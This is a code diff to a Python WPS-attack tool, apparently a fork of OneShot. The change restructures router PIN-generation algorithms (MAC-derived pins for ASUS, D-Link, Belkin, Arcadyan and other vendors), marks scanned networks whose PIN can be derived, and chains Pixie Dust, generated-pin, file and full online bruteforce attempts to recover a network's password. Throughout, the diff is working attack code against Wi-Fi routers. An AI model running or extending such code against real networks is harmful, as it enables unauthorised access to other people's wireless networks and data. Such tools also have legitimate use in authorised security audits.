@@ -858,8 +858,9 @@ class Companion:
             elif self.connection_status.status == 'WPS_FAIL':
                 break
 
+        success = self.connection_status.status == 'GOT_PSK'
         self.sendOnly('WPS_CANCEL')
-        return False
+        return success
 
     def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, pixieforce=False,
                           store_pin_on_fail=False):
@@ -1019,23 +1020,6 @@ class WiFiScanner:
         self.vuln_list = vuln_list
         self.reverse = reverse
 
-        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
-        try:
-            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
-                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
-                # Skip header
-                next(csvReader)
-                self.stored = []
-                for row in csvReader:
-                    self.stored.append(
-                        (
-                            row[1],   # BSSID
-                            row[2]    # ESSID
-                        )
-                    )
-        except FileNotFoundError:
-            self.stored = []
-
     def iw_scanner(self) -> Dict[int, dict]:
         """Parsing iw scan results"""
         def handle_network(line, result, networks):
@@ -1180,6 +1164,8 @@ class WiFiScanner:
                     text = '\033[91m{}\033[00m'.format(text)
                 elif color == 'yellow':
                     text = '\033[93m{}\033[00m'.format(text)
+                elif color == 'orange':
+                    text = '\033[38;5;208m{}\033[00m'.format(text)
                 else:
                     return text
             else:
@@ -1187,11 +1173,12 @@ class WiFiScanner:
             return text
 
         if self.vuln_list:
-            print('Network marks: {1} {0} {2} {0} {3}'.format(
+            print('Network marks: {1} {0} {2} {0} {3} {0} {4}'.format(
                 '|',
                 colored('Possibly vulnerable', color='green'),
                 colored('WPS locked', color='red'),
-                colored('Already stored', color='yellow')
+                colored('WPS code available', color='yellow'),
+                colored('WPS code can be from other models', color='orange')
             ))
         print('\n🔥Networks list:\n')
         print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
@@ -1225,15 +1212,19 @@ class WiFiScanner:
                 processed_model
             ]
             line = ' '.join(line_parts)
-            
-            if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in self.stored:
-                print(colored(line, color='yellow'))
-            elif network['WPS locked']:
+
+            if network['WPS locked']:
                 print(colored(line, color='red'))
-            elif self.vuln_list and (model in self.vuln_list):
-                print(colored(line, color='green'))
             else:
-                print(line)
+                model_pins = generate_model_pins(mac=network['BSSID'], ssid=network.get('ESSID'), model=network['Model'], device=network['Device name'])
+                if model_pins:
+                    print(colored(line, color='yellow'))
+                elif generate_suggested_pins(network['BSSID']):
+                    print(colored(line, color='orange'))
+                elif self.vuln_list and (model in self.vuln_list):
+                    print(colored(line, color='green'))
+                else:
+                    print(line)
 
         return network_list
 
@@ -1270,16 +1261,6 @@ def die(msg):
     sys.stderr.write(msg + '\n')
     sys.exit(1)
 
-def compute_checksum(pin7):
-    accum = 0
-    for i, c in enumerate(pin7):
-        digit = int(c)
-        if i % 2 == 0:
-            accum += 3 * digit
-        else:
-            accum += digit
-    return str((10 - accum % 10) % 10)
-
 
 def arcadyan_pin(mac):
     mac_clean = re.sub(r'[^0-9A-Fa-f]', '', mac or '').upper()
@@ -1289,7 +1270,7 @@ def arcadyan_pin(mac):
     try:
         num = int(h, 16) % 10000000
         pin7 = f"{num:07d}"
-        return pin7 + compute_checksum(pin7)
+        return pin7 + str(WPSpin.checksum(int(pin7)))
     except Exception:
         return None
 
@@ -1302,50 +1283,74 @@ def belkin_pin(mac):
         nic = int(mac_clean[-6:], 16)
         num = (nic + 1379) % 10000000
         pin7 = f"{num:07d}"
-        return pin7 + compute_checksum(pin7)
+        return pin7 + str(WPSpin.checksum(int(pin7)))
     except Exception:
         return None
 
-def generate_pins(mac=None, ssid=None, model="", device="", serial=None):
-    pins = [""]
-    pins.extend(COMMON_PINS)
 
+def _order_unique_pins(pins):
+    """Remove duplicates while preserving order and keep only valid 8-digit pins"""
+    seen = set()
+    ordered = []
+    for p in pins:
+        if p == "" or (p.isdigit() and len(p) == 8):
+            if p not in seen:
+                seen.add(p)
+                ordered.append(p)
+    return ordered
+
+
+MODEL_ALGO_HINTS = [
+    ("ASUS", "pinASUS"),
+    ("DIR", "pinDLink"),
+    ("D-LINK", "pinDLink"),
+    ("HG532", "pinHG532x"),
+    ("H108L", "pinH108L"),
+    ("THOMSON", "pinThomson"),
+    ("REALTEK", "pinRealtek1"),
+    ("RTL", "pinRealtek2"),
+    ("BROADCOM", "pinBrcm1"),
+    ("UR-814AC", "pinUR814AC"),
+    ("UR-825AC", "pinUR825AC"),
+    ("UPVEL", "pinUpvel"),
+    ("EDIMAX", "pinEdimax"),
+    ("ONLIME", "pinOnlime"),
+    ("AIROCON", "pinAirocon"),
+    ("CISCO", "pinCisco"),
+]
+
+
+def generate_model_pins(mac=None, ssid=None, model="", device=""):
+    """Generate pins based on explicit router model information"""
     gen = WPSpin()
     model_upper = (model or "").upper()
     device_upper = (device or "").upper()
     hint_blob = f"{model_upper} {device_upper} {ssid.upper() if ssid else ''}"
-
-    for sig, algo in [
-        ("ASUS", "pinASUS"),
-        ("DIR", "pinDLink"),
-        ("D-LINK", "pinDLink"),
-        ("HG532", "pinHG532x"),
-        ("H108L", "pinH108L"),
-        ("THOMSON", "pinThomson"),
-        ("REALTEK", "pinRealtek1"),
-        ("RTL", "pinRealtek2"),
-        ("BROADCOM", "pinBrcm1"),
-        ("UR-814AC", "pinUR814AC"),
-        ("UR-825AC", "pinUR825AC"),
-        ("UPVEL", "pinUpvel"),
-        ("EDIMAX", "pinEdimax"),
-        ("ONLIME", "pinOnlime"),
-        ("AIROCON", "pinAirocon"),
-        ("CISCO", "pinCisco"),
-    ]:
+    pins = []
+    for sig, algo in MODEL_ALGO_HINTS:
         if sig in hint_blob:
             try:
                 pins.append(gen.generate(algo, mac))
             except Exception:
                 pass
+    return _order_unique_pins(pins)
 
-    arc = arcadyan_pin(mac)
-    if arc:
-        pins.append(arc)
-    belk = belkin_pin(mac)
-    if belk:
-        pins.append(belk)
 
+def generate_suggested_pins(mac):
+    """Generate vendor related pins using MAC address suggestions"""
+    gen = WPSpin()
+    pins = []
+    try:
+        for item in gen.getSuggested(mac):
+            pins.append(item['pin'])
+    except Exception:
+        pass
+    return _order_unique_pins(pins)
+
+def generate_pins(mac=None, ssid=None, serial=None):
+    pins = []
+
+    gen = WPSpin()
     for algo in gen.algos:
         try:
             pins.append(gen.generate(algo, mac))
@@ -1356,7 +1361,7 @@ def generate_pins(mac=None, ssid=None, model="", device="", serial=None):
         try:
             num = int(hval, 16) % 10000000
             pin7 = f"{num:07d}"
-            return pin7 + compute_checksum(pin7)
+            return pin7 + str(WPSpin.checksum(int(pin7)))
         except Exception:
             return None
 
@@ -1365,7 +1370,7 @@ def generate_pins(mac=None, ssid=None, model="", device="", serial=None):
         try:
             val = int(mac_clean[-6:], 16)
             pin7 = f"{val % 10000000:07d}"
-            pins.append(pin7 + compute_checksum(pin7))
+            pins.append(pin7 + str(WPSpin.checksum(int(pin7))))
         except Exception:
             pass
         pin = _hash_to_pin(hashlib.md5(mac_clean.encode()).hexdigest())
@@ -1386,14 +1391,7 @@ def generate_pins(mac=None, ssid=None, model="", device="", serial=None):
             if pin:
                 pins.append(pin)
 
-    seen = set()
-    ordered = []
-    for p in pins:
-        if p == "" or (p.isdigit() and len(p) == 8):
-            if p not in seen:
-                seen.add(p)
-                ordered.append(p)
-    return ordered
+    return _order_unique_pins(pins)
 
 
 def try_pin_sequence(comp, bssid, pins, pixie=False):
@@ -1407,17 +1405,20 @@ def try_pin_sequence(comp, bssid, pins, pixie=False):
 
 
 def try_bruteforce_file(comp, bssid, path):
-    try:
-        with open(path, 'r') as f:
-            for line in f:
-                pin = line.strip()
-                if not pin or pin in TRIED_PINS:
-                    continue
-                TRIED_PINS.add(pin)
-                if comp.single_connection(bssid, pin):
-                    return True
-    except Exception as e:
-        print(f"[!] Failed to open bruteforce file: {e}")
+    for p in [path, os.path.join(os.path.dirname(__file__), path)]:
+        try:
+            with open(p, 'r') as f:
+                for line in f:
+                    pin = line.strip()
+                    if not pin or pin in TRIED_PINS:
+                        continue
+                    TRIED_PINS.add(pin)
+                    if comp.single_connection(bssid, pin):
+                        return True
+            return False
+        except Exception as e:
+            last = e
+    print(f"[!] Failed to open bruteforce file: {last}")
     return False
 
 def build_parser():
@@ -1427,8 +1428,7 @@ def build_parser():
     parser.add_argument('--pin', type=str, help='Use the specified pin (arbitrary string or 4/8 digit pin)')
     parser.add_argument('--pixie-dust', action='store_true', help='Run Pixie Dust attack')
     parser.add_argument('--pixie-force', action='store_true', help='Run Pixiewps with --force option (bruteforce full range)')
-    parser.add_argument('--bruteforce', action='store_true', help='Run online bruteforce attack')
-    parser.add_argument('--bruteforce-pins', type=str, help='Try WPS PINs from the specified file')
+    parser.add_argument('--bruteforce-pins', nargs='?', const=True, help='Bruteforce all pins when no file is given, otherwise try PINs from the specified file')
     parser.add_argument('--push-button-connect', action='store_true', help='Run WPS push button connection')
     parser.add_argument('--delay', type=float, help='Set the delay between pin attempts')
     parser.add_argument('--write', action='store_true', help='Write credentials to the file on success')
@@ -1471,9 +1471,7 @@ if __name__ == '__main__':
                         essid = network.get('ESSID')
                 if args.bssid:
                     companion = Companion(args.interface, args.write, print_debug=args.verbose)
-                    if args.bruteforce:
-                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
-                    elif args.pin:
+                    if args.pin:
                         companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.push_button_connect, args.pixie_force)
                     else:
                         print('[*] Trying NULL PIN...')
@@ -1484,18 +1482,24 @@ if __name__ == '__main__':
                             if args.pixie_dust:
                                 print('[*] Trying Pixie Dust attack...')
                                 companion.single_connection(args.bssid, None, pixiemode=True, pixieforce=args.pixie_force)
-                                if companion.connection_status.status == 'GOT_PSK':
-                                    pass
-                            model = network.get('Model', '') + network.get('Model number', '') if 'network' in locals() and network else ''
-                            device = network.get('Device name', '') if 'network' in locals() and network else ''
-                            pins = generate_pins(mac=args.bssid, ssid=essid, model=model, device=device)
-                            if not try_pin_sequence(companion, args.bssid, pins):
-                                if args.bruteforce_pins:
-                                    print('[*] Trying PINs from file...')
-                                    if not try_bruteforce_file(companion, args.bssid, args.bruteforce_pins):
-                                        print('[-] All PIN attempts failed.')
-                                else:
-                                    print('[-] All PIN attempts failed.')
+                            if companion.connection_status.status != 'GOT_PSK':
+                                model = network.get('Model', '') + network.get('Model number', '') if 'network' in locals() and network else ''
+                                device = network.get('Device name', '') if 'network' in locals() and network else ''
+                                if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device)):
+                                    if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid)):
+                                        if not try_pin_sequence(companion, args.bssid, COMMON_PINS):
+                                            if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p]):
+                                                if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p]):
+                                                    pins = generate_pins(mac=args.bssid, ssid=essid)
+                                                    if not try_pin_sequence(companion, args.bssid, pins):
+                                                        if isinstance(args.bruteforce_pins, str):
+                                                            print('[*] Trying PINs from file...')
+                                                            if not try_bruteforce_file(companion, args.bssid, args.bruteforce_pins):
+                                                                print('[-] All PIN attempts failed.')
+                                                        elif args.bruteforce_pins is True:
+                                                            companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                                                        else:
+                                                            print('[-] All PIN attempts failed.')
             if not args.loop:
                 break
             else:
